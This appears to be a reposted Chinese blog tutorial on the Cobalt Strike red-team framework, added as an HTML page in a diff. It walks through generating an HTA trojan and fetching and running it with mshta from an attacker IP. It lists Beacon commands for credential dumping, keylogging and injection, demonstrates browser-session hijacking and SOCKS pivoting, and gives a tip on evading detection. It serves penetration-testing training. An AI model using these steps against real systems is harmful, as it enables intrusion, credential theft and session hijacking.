@@ -1,0 +1,513 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cobalt Strike使用教程 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Cobalt Strike使用教程 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Cobalt Strike使用教程
+Cobalt Strike简介
+Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Cobalt Strike使用教程
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="cobalt-strike使用教程">Cobalt Strike使用教程</h2>
+<h3 id="cobalt-strike简介">Cobalt Strike简介</h3>
+<p><code>Cobalt Strike</code>是一款渗透测试神器，常被业界人称为CS神器。<code>Cobalt Strike</code>已经不再使用<code>MSF</code>而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p>
+<p><code>Cobalt Strike</code>集成了端口转发、扫描多模式端口<code>Listener</code>、<code>Windows exe</code>程序生成、<code>Windows dll</code>动态链接库生成、<code>java</code>程序生成、<code>office</code>宏代码生成，包括站点克隆获取浏览器的相关信息等。</p>
+<p><strong>团队作战图</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/10/14/nDgeAqSGwLHYush.png" alt="1602662928.jpg" loading="lazy"></figure>
+<p><strong>渗透测试图</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/10/14/nDgeAqSGwLHYush.png" alt="1602662928.jpg" loading="lazy"></figure>
+<h3 id="基础使用">基础使用</h3>
+<h4 id="0x00-基础接触">0x00 基础接触</h4>
+<p>其目录如下所示：</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/10/14/jPmD8AOcoWY5IMB.png" alt="15227540565126.png" loading="lazy"></figure>
+<pre><code>agscript                            拓展应用的脚本
+
+c2lint                              用于检查profile的错误异常
+
+teamserver                          服务端程序
+
+cobaltstrike，cobaltstrike.jar      客户端程序(java跨平台)
+
+logs                                目录记录与目标主机的相关信息
+
+update，update.jar                  用于更新CS
+
+third-party                         第三方工具
+</code></pre>
+<p>启动服务器</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2020/10/14/Tzau8tB4A21CdhQ.png" alt="1602663154_1_.jpg" loading="lazy"></figure>
+<p>客户端链接</p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2020/10/14/rgq82avIy3wpecX.png" alt="1602663184_1_.jpg" loading="lazy"></figure>
+<h4 id="0x01-参数详情">0x01 参数详情</h4>
+<h5 id="cobalt-strike">Cobalt Strike</h5>
+<pre><code>New Connection          # 新建连接，支持连接多个服务器端
+Preferences             # 设置CobalStrike界面、控制台、以及输出报告样式、TeamServer连接记录
+Visualization           # 主要展示输出结果的视图
+VPN Interfaces          # 设置VPN接口
+Listenrs                # 创建监听器
+Script Manager          # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等
+Close                   # 退出连接
+</code></pre>
+<h5 id="view">View</h5>
+<pre><code>Applications            # 显示受害主机的应用信息
+Credentials             # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz
+Downloads               # 查看已下载文件
+Event Log               # 主机上线记录以及团队协作聊天记录
+Keystrokes              # 查看键盘记录结果
+Proxy Pivots            # 查看代理模块
+Screenshots             # 查看所有屏幕截图
+Script Console          # 加载第三方脚本以增强功能 
+Targets                 # 显示所有受害主机
+Web Log                 # 所有Web服务的日志
+</code></pre>
+<h5 id="attacks">Attacks</h5>
+<p><strong>Packages</strong></p>
+<pre><code>HTML Application                # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件
+MS Office Macro                 # 生成office宏病毒文件
+Payload Generator               # 生成各种语言版本的payload
+USB/CD AutoPlay                 # 生成利用自动播放运行的木马文件
+Windows Dropper                 # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)
+Windows Executable              # 生成可执行exe木马
+Windows Executable(Stageless)   # 生成无状态的可执行exe木马
+</code></pre>
+<p><strong>Web Drive-by</strong></p>
+<pre><code>Manage                      # 对开启的web服务进行管理
+Clone Site                  # 克隆网站，可以记录受害者提交的数据
+Host File                   # 提供文件下载，可以选择Mime类型
+Scripted Web Delivery       # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery 
+Signed Applet Attack        # 使用java自签名的程序进行钓鱼攻击(该方法已过时)
+Smart Applet Attack         # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)
+System Profiler             # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等
+Spear Phish                 # 鱼叉钓鱼邮件
+</code></pre>
+<p><strong>Reporting</strong></p>
+<pre><code>Activity Report                         # 活动报告
+Hosts Report                            # 主机报告
+Indicators of Compromise                # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes
+Sessions Report                         # 会话报告
+Social Engineering Report               # 社会工程报告：包括鱼叉钓鱼邮件及点击记录
+Tactics, Techniques, and Procedures     # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略
+Reset Data                              # 重置数据
+Export Data                             # 导出数据，导出.tsv文件格式
+</code></pre>
+<p><strong>Help</strong></p>
+<pre><code>Homepage                # 官方主页
+Support                 # 技术支持
+Arsenal                 # 开发者
+System information      # 版本信息
+About                   # 关于
+</code></pre>
+<p><strong>工具栏</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2020/10/14/wDyHUXoGg5nYPKT.png" alt="1602664104_1_.jpg" loading="lazy"></figure>
+<pre><code>1.新建连接
+2.断开当前连接
+3.监听器
+4.改变视图为Pivot Graph(视图列表)
+5.改变视图为Session Table(会话列表)
+6.改变视图为Target Table(目标列表)
+7.显示所有以获取的受害主机的凭证
+8.查看已下载文件
+9.查看键盘记录结果
+10.查看屏幕截图
+11.生成无状态的可执行exe木马
+12.使用java自签名的程序进行钓鱼攻击
+13.生成office宏病毒文件
+14.为payload提供web服务以便下载和执行
+15.提供文件下载，可以选择Mime类型
+16.管理Cobalt Strike上运行的web服务
+17.帮助
+18.关于
+</code></pre>
+<h4 id="0x02-基本流程">0x02 基本流程</h4>
+<ul>
+<li><strong>创建监听器</strong></li>
+</ul>
+<p>点击<code>Cobalt Strike -&gt; Listeners-&gt;Add</code>，其中内置了九个<code>Listener</code></p>
+<pre><code>indows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http
+windows/beacon_http/reverse_http
+windows/beacon_https/reverse_https
+windows/beacon_smb/bind_pipe
+windows/foreign/reverse_dns_txt
+windows/foreign/reverse_http
+windows/foreign/reverse_https
+windows/foreign/reverse_tcp
+</code></pre>
+<p>其中<code>windows/beacon</code>为内置监听器，包括<code>dns</code>、<code>http</code>、<code>https</code>、<code>smb</code>四种方式的监听器；<code>windows/foreign</code>为外部监听器，配合<code>Metasploit</code>或者<code>Armitage</code>的监听器。</p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2020/10/14/SyCi1q9J8aTKdzc.png" alt="1602664268_1_.jpg" loading="lazy"></figure>
+<p><code>Name</code>任意，选择所需的<code>payload</code>，<code>Host</code>为本机<code>IP</code>，<code>port</code>为没有被占用的任意端口<br>
+点击<code>save</code>即创建成功</p>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2020/10/14/GwSTieZtRF1Wlvk.png" alt="1602664340_1_.jpg" loading="lazy"></figure>
+<p><strong>生成木马</strong></p>
+<p>这里选择其中一种攻击方式作示范，后面再做详细解释：<br>
+点击<code>Attacks-&gt;Packages-&gt;HTML</code> <code>Application</code>，选择对应的监听器，方法这里有三种(<code>executable/VBA/powershell</code>)，选择<code>powershell</code>，点击<code>Generate</code>生成，选择生成的路径及文件名保存即可。</p>
+<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2020/10/14/KYdZy1LBObxju3N.png" alt="1602664385_1_.jpg" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2020/10/14/BgAlQI2VykKdzsR.png" alt="1602664419_1_.jpg" loading="lazy"></figure>
+<p><strong>开启web服务</strong></p>
+<p>点击<code>Attacks-&gt;Web</code> <code>Drive-by-&gt;Host File</code>，选择刚刚生成的木马<code>evil.hta</code>，点击<code>Launch</code>生成下载链接</p>
+<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2020/10/14/sfl6rStw2FychjB.png" alt="1602664468_1_.jpg" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2020/10/14/sbUdBYjwrRfWDPS.png" alt="1602664497_1_.jpg" loading="lazy"></figure>
+<p><strong>运行木马</strong></p>
+<p>打开受害机<code>cmd</code>，运行<code>mshta</code>命令。<code>mshta.exe</code>是微软<code>Windows</code>操作系统相关程序，用于执行<code>.HTA</code>文件。</p>
+<pre><code>mshta http://192.168.183.147/download/file.ext
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2020/10/14/59WSC26gQR7YEkG.png" alt="1602664547_1_.jpg" loading="lazy"></figure>
+<p>返回CS即可看到肉鸡上线</p>
+<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2020/10/14/5afprR2StNJknsA.png" alt="1602664584_1_.jpg" loading="lazy"></figure>
+<p>选中受害机右击，选择<code>interact</code>，即可进行交互，由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。</p>
+<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2020/10/14/qaSuIrnZROFKN2B.png" alt="1602664670.jpg" loading="lazy"></figure>
+<p><strong>导出报告</strong></p>
+<p>点击<code>Reporting-&gt;Activity Report</code>，导出默认PDF文档</p>
+<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2020/10/14/qOzhLjyxSYVXlpb.png" alt="1602664701_1_.jpg" loading="lazy"></figure>
+<h4 id="0x03-beacon">0x03 Beacon</h4>
+<p>当受害机上线以后，右击选择<code>Interact</code>，就可以打<code>开Beacon Console</code><br>
+在<code>beacon</code>处输入<code>help</code>可以看到命令说明</p>
+<pre><code>Beacon Commands
+===============
+
+    Command                   Description
+    -------                   -----------
+    argue                     进程参数欺骗
+    blockdlls                 在子进程中阻止非Microsoft的DLLs文件
+    browserpivot              注入受害者浏览器进程
+    bypassuac                 绕过UAC
+    cancel                    取消正在进行的下载
+    cd                        切换目录
+    checkin                   强制让被控端回连一次
+    clear                     清除beacon内部的任务队列
+    connect                   通过TCP连接到Beacon
+    covertvpn                 部署Covert VPN客户端
+    cp                        复制文件
+    dcsync                    从DC中提取密码哈希
+    desktop                   远程VNC
+    dllinject                 反射DLL注入进程
+    dllload                   使用LoadLibrary将DLL加载到进程中
+    download                  下载文件
+    downloads                 列出正在进行的文件下载
+    drives                    列出目标盘符
+    elevate                   尝试提权
+    execute                   在目标上执行程序(无输出)
+    execute-assembly          在目标上内存中执行本地.NET程序
+    exit                      退出beacon
+    getprivs                  对当前令牌启用系统权限
+    getsystem                 尝试获取SYSTEM权限
+    getuid                    获取用户ID
+    hashdump                  转储密码哈希值
+    help                      帮助
+    inject                    在特定进程中生成会话
+    jobkill                   杀死一个后台任务
+    jobs                      列出后台任务
+    kerberos_ccache_use       从ccache文件中导入票据应用于此会话
+    kerberos_ticket_purge     清除当前会话的票据
+    kerberos_ticket_use       从ticket文件中导入票据应用于此会话
+    keylogger                 键盘记录
+    kill                      结束进程
+    link                      通过命名管道连接到Beacon
+    logonpasswords            使用mimikatz转储凭据和哈希值
+    ls                        列出文件
+    make_token                创建令牌以传递凭据
+    mimikatz                  运行mimikatz
+    mkdir                     创建一个目录
+    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)
+    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
+    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)
+    mode http                 使用HTTP作为通信通道
+    mv                        移动文件
+    net                       net命令
+    note                      给当前目标机器备注       
+    portscan                  进行端口扫描
+    powerpick                 通过Unmanaged PowerShell执行命令
+    powershell                通过powershell.exe执行命令
+    powershell-import         导入powershell脚本
+    ppid                      为生成的post-ex任务设置父PID
+    ps                        显示进程列表
+    psexec                    使用服务在主机上生成会话
+    psexec_psh                使用PowerShell在主机上生成会话
+    psinject                  在特定进程中执行PowerShell命令
+    pth                       使用Mimikatz进行传递哈希
+    pwd                       当前目录位置
+    reg                       查询注册表
+    rev2self                  恢复原始令牌
+    rm                        删除文件或文件夹
+    rportfwd                  端口转发
+    run                       在目标上执行程序(返回输出)
+    runas                     以另一个用户权限执行程序
+    runasadmin                在高权限下执行程序
+    runu                      在另一个PID下执行程序
+    screenshot                屏幕截图
+    setenv                    设置环境变量
+    shell                     cmd执行命令
+    shinject                  将shellcode注入进程
+    shspawn                   生成进程并将shellcode注入其中
+    sleep                     设置睡眠延迟时间
+    socks                     启动SOCKS4代理
+    socks stop                停止SOCKS4
+    spawn                     生成一个会话 
+    spawnas                   以其他用户身份生成会话
+    spawnto                   将可执行程序注入进程
+    spawnu                    在另一个PID下生成会话
+    ssh                       使用ssh连接远程主机
+    ssh-key                   使用密钥连接远程主机
+    steal_token               从进程中窃取令牌
+    timestomp                 将一个文件时间戳应用到另一个文件
+    unlink                    断开与Beacon的连接
+    upload                    上传文件
+    wdigest                   使用mimikatz转储明文凭据
+    winrm                     使用WinRM在主机上生成会话
+    wmi                       使用WMI在主机上生成会话
+</code></pre>
+<p>可用<code>help+</code>命令的方式查看具体命令参数说明</p>
+<pre><code>beacon&gt; help argue
+Use: argue [command] [fake arguments]
+     argue [command]
+     argue
+
+Spoof [fake arguments] for [command] processes launched by Beacon.
+This option does not affect runu/spawnu, runas/spawnas, or post-ex jobs.
+
+Use argue [command] to disable this feature for the specified command.
+
+Use argue by itself to list programs with defined spoofed arguments.
+</code></pre>
+<p>之前说过CS与受害机默认60s进行一次交互，为了方便实验我们可以把时间设置为0</p>
+<pre><code>beacon&gt;sleep 0
+</code></pre>
+<h4 id="0x03常用命令">0x03常用命令</h4>
+<h5 id="browserpivot">browserpivot</h5>
+<p><code>Browser Pivot</code>是一个针对IE浏览器的技术，利用的是IE的<code>cookie</code>机制，<code>Cobalt Strike</code>通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。</p>
+<p>假设受害者在通过IE浏览器登录了网站后台</p>
+<figure data-type="image" tabindex="17"><img src="https://i.loli.net/2020/10/14/YBRwQjorsvxepFa.png" alt="1602664920_1_.jpg" loading="lazy"></figure>
+<p>我们可以通过ps找到浏览器进程，然后通过命令进行注入</p>
+<pre><code>beacon&gt; browserpivot 2600 x86
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://i.loli.net/2020/10/14/xwXUuzqsRBk2y1b.png" alt="1602664989_1_.jpg" loading="lazy"></figure>
+<p>这里之所以选择PID 2600是因为我们需要插入<code>Internet</code> Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用<code>iexplore.exe</code>时，该进程就是子选项卡。<br>
+当然这里也可以通过图形界面注入，右击选中<code>Explore</code>-&gt;<code>Browser Pivot</code></p>
+<figure data-type="image" tabindex="19"><img src="https://i.loli.net/2020/10/14/MwFdXIat2sCrUWT.png" alt="1602665034_1_.jpg" loading="lazy"></figure>
+<p>然后浏览器设置代理</p>
+<figure data-type="image" tabindex="20"><img src="https://i.loli.net/2020/10/14/Rlob2iYLOKTd78F.png" alt="1602665122_1_.jpg" loading="lazy"></figure>
+<p>然后访问受害者所访问的网页，发现无需登录直接进入后台</p>
+<figure data-type="image" tabindex="21"><img src="https://i.loli.net/2020/10/14/8C2Z3JLqzRxISkB.png" alt="1602665157_1_.jpg" loading="lazy"></figure>
+<h5 id="socks代理">Socks代理</h5>
+<p>开启<code>socks4a</code>代理，通过代理进行内网渗透</p>
+<p>开启<code>socks</code>，可以通过命令，也可以通过右键<code>Pivoting</code>-&gt;<code>SOCKS Server</code></p>
+<pre><code>beacon&gt; socks 2222
+[+] started SOCKS4a server on: 2222
+[+] host called home, sent: 16 bytes
+</code></pre>
+<p>然后<code>vim /etc/proxychains.conf</code> ，在文件末尾添加socks4代理服务器</p>
+<p>使用<code>proxychains</code>代理扫描内网主机</p>
+<pre><code>proxychains nmap -sP 192.168.183.0/24
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://i.loli.net/2020/10/14/WCqG16d5IfnVym9.png" alt="1602665280_1_.jpg" loading="lazy"></figure>
+<p>我们还可以通过隧道将整个msf带进目标内网</p>
+<p>点击<code>View</code>-&gt;<code>Proxy Pivots</code>，选择<code>Socks4a Proxy</code>,点击<code>Tunnel</code>:</p>
+<figure data-type="image" tabindex="23"><img src="https://i.loli.net/2020/10/14/UBrwQmGcaRJN73s.png" alt="1602665336_1_.jpg" loading="lazy"></figure>
+<pre><code>setg Proxies socks4:192.168.183.147:2222
+</code></pre>
+<p>打开msf对内网进行扫描</p>
+<figure data-type="image" tabindex="24"><img src="https://i.loli.net/2020/10/14/Fg7wTN13pLKhUOv.png" alt="1602665403_1_.jpg" loading="lazy"></figure>
+<p>关闭socks</p>
+<pre><code>beacon&gt;socks stop
+</code></pre>
+<h5 id="powershell-import">powershell-import</h5>
+<p>这个功能在后渗透测试中很有用，可以导入各种<code>powershell</code>渗透框架，如<code>Nishang</code>、<code>PowerSploit</code>攻击框架<br>
+在<code>beacon shell</code>输入<code>powershell-import</code>，导入已有的<code>ps</code>文件</p>
+<pre><code>beacon&gt; powershell-import
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://i.loli.net/2020/10/14/lHxaY13ERSN2nWZ.png" alt="1602665490_1_.jpg" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://i.loli.net/2020/10/14/F6jHUx9OsPqwlVC.png" alt="1602665520_1_.jpg" loading="lazy"></figure>
+<p>关于具体有哪些命令可以操作可以查看一下相应ps文件</p>
+<h4 id="0x04-附录">0x04 附录</h4>
+<p>爆破<code>cobalt strike</code>密码脚本：<code>https://github.com/ryanohoro/csbruter</code></p>
+<figure data-type="image" tabindex="27"><img src="https://i.loli.net/2020/10/14/kWCeM8XplgsEx5S.png" alt="1602665663_1_.jpg" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="https://i.loli.net/2020/10/14/Wj3QdTDbRfkEimz.png" alt="1602665706_1_.jpg" loading="lazy"></figure>
+<p><mark><strong>注</strong>：转自https://blog.csdn.net/weixin_44677409/article/details/102725129</mark></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#cobalt-strike%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">Cobalt Strike使用教程</a>
+<ul>
+<li><a href="#cobalt-strike%E7%AE%80%E4%BB%8B">Cobalt Strike简介</a></li>
+<li><a href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8">基础使用</a>
+<ul>
+<li><a href="#0x00-%E5%9F%BA%E7%A1%80%E6%8E%A5%E8%A7%A6">0x00 基础接触</a></li>
+<li><a href="#0x01-%E5%8F%82%E6%95%B0%E8%AF%A6%E6%83%85">0x01 参数详情</a>
+<ul>
+<li><a href="#cobalt-strike">Cobalt Strike</a></li>
+<li><a href="#view">View</a></li>
+<li><a href="#attacks">Attacks</a></li>
+</ul>
+</li>
+<li><a href="#0x02-%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B">0x02 基本流程</a></li>
+<li><a href="#0x03-beacon">0x03 Beacon</a></li>
+<li><a href="#0x03%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">0x03常用命令</a>
+<ul>
+<li><a href="#browserpivot">browserpivot</a></li>
+<li><a href="#socks%E4%BB%A3%E7%90%86">Socks代理</a></li>
+<li><a href="#powershell-import">powershell-import</a></li>
+</ul>
+</li>
+<li><a href="#0x04-%E9%99%84%E5%BD%95">0x04 附录</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/ladon-da-xing-nei-wang-shen-tou-sao-miao-qi/">
+              <h3 class="post-title">
+                Ladon大型内网渗透扫描器
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
